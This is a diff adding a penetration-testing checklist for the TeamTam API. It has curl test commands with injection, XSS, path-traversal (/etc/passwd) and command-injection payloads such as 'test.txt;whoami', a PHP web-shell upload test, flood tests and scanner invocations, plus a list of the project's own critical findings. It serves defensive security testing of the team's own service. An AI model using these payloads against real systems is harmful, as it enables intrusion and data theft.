@@ -1,0 +1,464 @@
+# Security Testing Checklist for TeamTam API
+
+## Quick VAPT Testing Guide
+
+### Authentication & Authorization Tests
+
+#### 1. **Brute Force Protection**
+- [ ] Test login endpoint with multiple failed attempts
+- [ ] Verify rate limiting kicks in after 5 attempts
+- [ ] Check if account gets locked after excessive attempts
+- [ ] Test password reset rate limiting
+
+**Test Command:**
+```bash
+# Test rate limiting on login
+for i in {1..10}; do
+  curl -X POST http://localhost:5000/api/v1/Login/LoginWithDomain \
+    -H "Content-Type: application/json" \
+    -d '{"email":"test@test.com","password":"wrong"}'
+  echo "Attempt $i"
+done
+```
+
+#### 2. **Unauthorized Access**
+- [ ] Access protected endpoints without authentication
+- [ ] Test with expired JWT tokens
+- [ ] Test with tampered JWT tokens
+- [ ] Try accessing other users' resources (IDOR)
+
+**Test Command:**
+```bash
+# Test without token
+curl http://localhost:5000/api/v1/Organization/GetAll
+
+# Test with invalid token
+curl -H "Authorization: Bearer invalid_token" \
+  http://localhost:5000/api/v1/Organization/GetAll
+```
+
+#### 3. **Privilege Escalation**
+- [ ] Regular user trying admin endpoints
+- [ ] Partner trying to access super admin functions
+- [ ] Test role-based access controls
+
+**Test Command:**
+```bash
+# Login as regular user, try admin endpoint
+curl -H "Authorization: Bearer <user_token>" \
+  http://localhost:5000/api/v1/SystemConfiguration/GetAll
+```
+
+#### 4. **Session Management**
+- [ ] Token expiration works correctly
+- [ ] Logout invalidates tokens
+- [ ] Concurrent sessions handling
+- [ ] Session fixation vulnerabilities
+
+---
+
+### Input Validation Tests
+
+#### 5. **SQL Injection**
+- [ ] Test MongoDB injection in query parameters
+- [ ] Test in request bodies
+- [ ] Test in headers
+
+**Test Payloads:**
+```bash
+# Test in query parameter
+curl "http://localhost:5000/api/v1/User/GetById?id={'$ne':null}"
+
+# Test in email field
+curl -X POST http://localhost:5000/api/v1/Login/LoginWithDomain \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@test.com'\'' OR 1=1--","password":"test"}'
+```
+
+#### 6. **XSS (Cross-Site Scripting)**
+- [ ] Test script injection in inputs
+- [ ] Test HTML injection
+- [ ] Test event handler injection
+
+**Test Payloads:**
+```bash
+curl -X POST http://localhost:5000/api/v1/Organization/Create \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <token>" \
+  -d '{"name":"<script>alert(1)</script>","email":"test@test.com"}'
+
+curl -X POST http://localhost:5000/api/v1/User/Create \
+  -d '{"name":"<img src=x onerror=alert(1)>","email":"test@test.com"}'
+```
+
+#### 7. **Path Traversal**
+- [ ] Test file access with ../ sequences
+- [ ] Test URL encoded traversal
+- [ ] Test absolute paths
+
+**Test Payloads:**
+```bash
+# Directory traversal
+curl "http://localhost:5000/api/v1/File/Download?path=../../../../etc/passwd"
+curl "http://localhost:5000/api/v1/File/Download?path=%2e%2e%2f%2e%2e%2f"
+
+# Screenshot access
+curl "http://localhost:5000/api/v1/Screenshots/Get?path=../../sensitive-data"
+```
+
+#### 8. **Command Injection**
+- [ ] Test command injection in file operations
+- [ ] Test in any system call parameters
+
+**Test Payloads:**
+```bash
+curl "http://localhost:5000/api/v1/File/Process?filename=test.txt;whoami"
+curl "http://localhost:5000/api/v1/File/Process?filename=test.txt|ls -la"
+```
+
+---
+
+### API Security Tests
+
+#### 9. **CSRF Protection**
+- [ ] State-changing operations require CSRF token
+- [ ] Verify SameSite cookie attribute
+- [ ] Test cross-origin requests
+
+**Test Command:**
+```bash
+# Attempt POST without CSRF token
+curl -X POST http://localhost:5000/api/v1/User/Delete \
+  -H "Authorization: Bearer <token>" \
+  -H "Content-Type: application/json" \
+  -d '{"id":"123"}'
+```
+
+#### 10. **CORS Misconfiguration**
+- [ ] Test Access-Control-Allow-Origin
+- [ ] Test with different origins
+- [ ] Verify credentials handling
+
+**Test Command:**
+```bash
+# Test CORS from different origin
+curl -H "Origin: http://evil.com" \
+  -H "Access-Control-Request-Method: POST" \
+  -H "Access-Control-Request-Headers: X-Requested-With" \
+  -X OPTIONS http://localhost:5000/api/v1/Login
+```
+
+#### 11. **Security Headers**
+- [ ] X-Frame-Options present
+- [ ] Content-Security-Policy present
+- [ ] X-Content-Type-Options: nosniff
+- [ ] Strict-Transport-Security (HTTPS)
+- [ ] X-XSS-Protection present
+
+**Test Command:**
+```bash
+curl -I http://localhost:5000/api/v1/Login | grep -i "x-frame\|content-security\|x-content\|strict-transport\|x-xss"
+```
+
+#### 12. **Information Disclosure**
+- [ ] Error messages don't reveal system info
+- [ ] Stack traces not exposed
+- [ ] Server version not disclosed
+- [ ] API documentation not publicly accessible
+
+**Test Command:**
+```bash
+# Test error messages
+curl -X POST http://localhost:5000/api/v1/User/Create \
+  -d '{"invalid":"data"}'
+
+# Check server headers
+curl -I http://localhost:5000 | grep -i "server\|x-powered\|x-aspnet"
+```
+
+---
+
+### Data Security Tests
+
+#### 13. **Sensitive Data Exposure**
+- [ ] Passwords not logged
+- [ ] Tokens not in logs
+- [ ] PII properly encrypted
+- [ ] Connection strings secured
+
+**Test:**
+```bash
+# Check logs for sensitive data
+grep -r "password\|token\|secret" /var/log/teamtam/
+
+# Check configuration files
+grep -r "ConnectionString\|ApiKey\|Secret" appsettings*.json
+```
+
+#### 14. **Encryption**
+- [ ] HTTPS enforced
+- [ ] Sensitive data encrypted at rest
+- [ ] Strong encryption algorithms used
+- [ ] No hardcoded encryption keys
+
+**Test Command:**
+```bash
+# Test if HTTP redirects to HTTPS
+curl -I http://api.teamtam.com
+
+# Test TLS version
+nmap --script ssl-enum-ciphers -p 443 api.teamtam.com
+```
+
+#### 15. **File Upload Security**
+- [ ] File type validation
+- [ ] File size limits
+- [ ] Malware scanning
+- [ ] Filename sanitization
+
+**Test Payloads:**
+```bash
+# Test file size limit
+dd if=/dev/zero of=large.jpg bs=1M count=100
+curl -X POST http://localhost:5000/api/v1/Upload \
+  -F "file=@large.jpg"
+
+# Test malicious file type
+echo "<?php system($_GET['cmd']); ?>" > shell.php
+curl -X POST http://localhost:5000/api/v1/Upload \
+  -F "file=@shell.php"
+
+# Test double extension
+cp malicious.php malicious.jpg.php
+curl -X POST http://localhost:5000/api/v1/Upload \
+  -F "file=@malicious.jpg.php"
+```
+
+---
+
+### Business Logic Tests
+
+#### 16. **IDOR (Insecure Direct Object References)**
+- [ ] Test accessing other users' data
+- [ ] Test accessing other organizations' data
+- [ ] Test modifying other users' resources
+
+**Test Commands:**
+```bash
+# Login as User A
+USER_A_TOKEN="<user_a_token>"
+USER_B_ID="<user_b_id>"
+
+# Try to access User B's data
+curl -H "Authorization: Bearer $USER_A_TOKEN" \
+  "http://localhost:5000/api/v1/User/Get?id=$USER_B_ID"
+
+# Try to modify User B's data
+curl -X POST -H "Authorization: Bearer $USER_A_TOKEN" \
+  -H "Content-Type: application/json" \
+  "http://localhost:5000/api/v1/User/Update" \
+  -d "{\"id\":\"$USER_B_ID\",\"role\":\"Admin\"}"
+```
+
+#### 17. **Price/Quantity Manipulation**
+- [ ] Negative quantities
+- [ ] Price tampering
+- [ ] Discount manipulation
+
+**Test Payloads:**
+```bash
+# Test negative quantity
+curl -X POST http://localhost:5000/api/v1/Payment/Process \
+  -H "Authorization: Bearer <token>" \
+  -d '{"amount":-100,"quantity":-5}'
+
+# Test price manipulation
+curl -X POST http://localhost:5000/api/v1/Subscription/Create \
+  -d '{"planId":"premium","price":0.01}'
+```
+
+---
+
+### Infrastructure Tests
+
+#### 18. **SSL/TLS Configuration**
+- [ ] Strong cipher suites
+- [ ] TLS 1.2+ only
+- [ ] Certificate validity
+- [ ] No mixed content
+
+**Test Command:**
+```bash
+# Test SSL configuration
+sslyze --regular api.teamtam.com
+
+# Or use testssl.sh
+./testssl.sh https://api.teamtam.com
+```
+
+#### 19. **API Rate Limiting**
+- [ ] Global rate limits
+- [ ] Per-endpoint limits
+- [ ] Per-user limits
+- [ ] Proper 429 responses
+
+**Test Command:**
+```bash
+# Flood test
+ab -n 1000 -c 10 http://localhost:5000/api/v1/Login
+```
+
+#### 20. **DDoS Protection**
+- [ ] Request size limits
+- [ ] Connection limits
+- [ ] Slowloris protection
+
+---
+
+### Compliance Tests
+
+#### 21. **GDPR Compliance**
+- [ ] User data export functionality
+- [ ] User data deletion (right to erasure)
+- [ ] Consent management
+- [ ] Data breach notification procedures
+
+#### 22. **Logging & Monitoring**
+- [ ] Authentication attempts logged
+- [ ] Failed access attempts logged
+- [ ] Data modifications logged
+- [ ] Security events monitored
+
+---
+
+## Automated Testing Tools
+
+### Install and Run These Tools:
+
+#### 1. **OWASP ZAP (Zed Attack Proxy)**
+```bash
+# Docker command
+docker run -t owasp/zap2docker-stable zap-baseline.py \
+  -t http://localhost:5000/api/v1
+```
+
+#### 2. **Nikto Web Scanner**
+```bash
+nikto -h http://localhost:5000
+```
+
+#### 3. **SQLMap (SQL Injection)**
+```bash
+sqlmap -u "http://localhost:5000/api/v1/User/Get?id=1" \
+  --cookie="auth=<token>"
+```
+
+#### 4. **Burp Suite**
+- Use for manual penetration testing
+- Test all endpoints systematically
+- Intercept and modify requests
+
+#### 5. **Nmap (Network Scanning)**
+```bash
+nmap -sV -sC api.teamtam.com
+```
+
+#### 6. **Dependency Check**
+```bash
+dependency-check --project TeamTamApi --scan . --format HTML
+```
+
+---
+
+## Critical Vulnerabilities Found
+
+### Immediate Attention Required:
+
+1. **Hardcoded Credentials in appsettings.json**
+   - Location: Line 39
+   - Azure Blob connection string exposed
+   - Action: Remove immediately, rotate keys
+
+2. **Missing Authorization on Stealth Endpoints**
+   - Endpoints: stealthLoginByEmail, loginForStealth
+   - Action: Add [Authorize] attributes
+
+3. **HTTPS Metadata Disabled**
+   - Location: Program.cs line 92
+   - Action: Enable in production
+
+4. **No Rate Limiting**
+   - All authentication endpoints
+   - Action: Implement rate limiting
+
+5. **No Security Headers**
+   - Missing X-Frame-Options, CSP, etc.
+   - Action: Add security headers middleware
+
+---
+
+## Test Results Template
+
+```markdown
+# VAPT Test Results - [Date]
+
+## Summary
+- Total Tests: 
+- Passed: 
+- Failed: 
+- Critical Issues: 
+- High Issues: 
+- Medium Issues: 
+- Low Issues: 
+
+## Critical Findings
+
+### 1. [Vulnerability Name]
+- **Severity:** Critical
+- **Location:** 
+- **Description:** 
+- **Impact:** 
+- **Remediation:** 
+- **Status:** Open/Fixed
+
+## Recommendations
+1. 
+2. 
+3. 
+
+## Next Steps
+- [ ] 
+- [ ] 
+```
+
+---
+
+## Retest After Fixes
+
+After implementing security fixes, retest:
+
+```bash
+# Run full OWASP ZAP scan
+docker run -t owasp/zap2docker-stable zap-full-scan.py \
+  -t http://localhost:5000/api/v1 \
+  -r security-report.html
+
+# Verify security headers
+curl -I https://api.teamtam.com | grep -E "X-Frame|Content-Security|X-Content-Type"
+
+# Test rate limiting
+./test-rate-limiting.sh
+
+# Run dependency check
+dotnet list package --vulnerable
+```
+
+---
+
+## Contact
+
+For security concerns: security@teamtam.com
+
+---
+
+*Keep this checklist updated with each security assessment*
